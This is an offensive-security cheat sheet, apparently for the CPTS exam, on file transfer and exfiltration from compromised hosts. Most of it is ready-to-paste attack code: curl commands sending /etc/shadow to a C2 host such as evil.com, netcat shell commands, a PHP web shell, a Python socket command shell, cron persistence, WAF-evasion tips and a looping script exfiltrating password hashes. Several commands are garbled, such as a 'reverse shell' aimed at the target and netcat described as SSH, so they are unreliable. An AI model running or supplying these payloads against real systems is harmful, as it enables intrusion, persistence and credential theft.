# 20-File-Transfer-Tricks: CPTS Exam Survival

Transfer data, exfiltrate files, and test file permissions without triggering EDRs. Master the tools that matter for the certification.

## Attack Workflow

1.  **Recon & Enumeration**: Identify upload paths, permissions, and existing files.
2.  **Payload Delivery**: Drop a file or use a proxy/stealer to push data.
3.  **Exfiltration**: Retrieve the stolen data or trigger a remote command.
4.  **Cleanup/Escape**: Move files or pivot to lateral movement.

## Commands Section

### 1. Enumerate File Upload Paths & Permissions
```bash
# List all files/directories with permissions
ls -la /var/www/html/uploads

# Check specific upload directory for writable permissions
find /var/www -type d -perm /002 2>/dev/null | xargs -I {} sh -c 'echo "{}" | xxd -p'

# Identify open SFTP/FTP services
nmap -sV --script ftp-browse,ftps-anon-auth -p 20-21 {target}
nmap --script ftp-anon {target} -p 21
```

### 2. Upload via Web Interface (Manual & Automated)
*Prerequisites: Identify form action/params using ffuf or curl*

```bash
# Fuzz upload action parameters
ffuf -w words.txt -u "http://{target}/uploads/" -X POST -d "formaction={FUZZ}" -q

# Upload a malicious script directly
curl -X POST "http://{target}/api/upload" -F "file=@/tmp/evil.php" -H "X-Test-Key: admin"

# Bypass size limits (common in web shells)
curl --data-binary "@/tmp/hack.sh" "http://{target}/api/v1/exec"
```

### 3. File Exfiltration
*Push data out using the compromised host*

```bash
# Exfiltrate sensitive files using curl to a C2 server
curl -T /etc/shadow http://evil.com/dump.txt

# Push via HTTP PUT (if configured)
curl -T /etc/passwd http://{target}/api/upload

# Send email (if mail relay available)
curl -X POST "http://{target}/api/sendmail" --data "email=admin@corp.com; body=DATA:base64,/etc/passwd"

# Use netcat to exfil over SSH (risky but effective)
nc -e /bin/sh {attacker_ip} 4444 < /etc/shadow
```

### 4. Proxy/Reverse Shell for File Transfer
```bash
# Reverse shell via bash (portable)
nc -e /bin/bash {target} 4444 < file_to_push.sh | sh {target}

# Upload file via proxy chain (if proxy exists)
curl --proxy {proxy_user}:{proxy_pass}@{proxy_ip}:8080 -d "file=@/tmp/evil.sh" "http://{target}/api/trigger"
```

### 5. Common Web Shells (Copy-Paste)
```bash
# PHP shell (generic)
<?php system($_GET['cmd']); // or @exec($_GET['cmd']); ?>

# Python shell (highly persistent, hard to detect)
#!/usr/bin/env python3
import socket,subprocess,os,time
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{target}",4444))
while True:
    while True:
        c=s.recv(1024).strip()
        if not c or c=='$':break
        os.system(c)
    s.sendall("$".encode())
```

## Tips & Shortcuts

*   **Flag**: Look for `allow_url_file_execute`, `exec`, `passthru` in `phpinfo.php`.
*   **Shortcut**: If `ls` works, `curl -T` almost certainly works if the server permits `PUT` requests.
*   **Steal**: Use `tmux split-window` to separate upload and download streams simultaneously.
*   **Persistence**: Drop the shell as a cron job (`crontab -e -u www-data`) instead of just a file for longer-term access.

## Common Mistakes

*   **Using `scp` directly**: Often blocked by firewalls or WAFs; prefer `curl` or `wget`.
*   **Ignoring WAF signatures**: Don't upload files that clearly look like scripts (use base64 or `--disable-proxy` in curl).
*   **Targeting the wrong port**: Web upload is usually port 80/443, not 21/22 unless SFTP is explicitly open.
*   **Forgetting Authentication**: Many upload endpoints require a specific header (e.g., `X-Admin-Token`).

## Mini Automation Scripts

### Bash: Upload & Exfil Loop
```bash
#!/bin/bash
FILE_PATH="/etc/passwd"
C2_SERVER="http://10.10.10.1/exfil.php"
UPLOAD_CMD="curl -T $FILE_PATH http://{target}/api/upload"
EXFIL_CMD="curl -X POST http://{target}/api/exfil -d @/tmp/data.txt"

# Attempt upload
$UPLOAD_CMD
sleep 1

# Trigger exfil (if upload returns success code)
$EXFIL_CMD
```

### Python: Persistent File Handler
```python
import requests
import base64
from pathlib import Path

def get_file():
    return str(Path('/etc/shadow').read_text())

def send_to_c2(file_content):
    encoded = base64.b64encode(file_content.encode()).decode()
    # Use your custom endpoint
    r = requests.post("http://{c2_ip}/upload", data={"payload": encoded}, headers={"X-Session": "long"})
    return r.status_code

# Continuous loop
while True:
    try:
        data = get_file()
        send_to_c2(data)
    except Exception as e:
        pass
```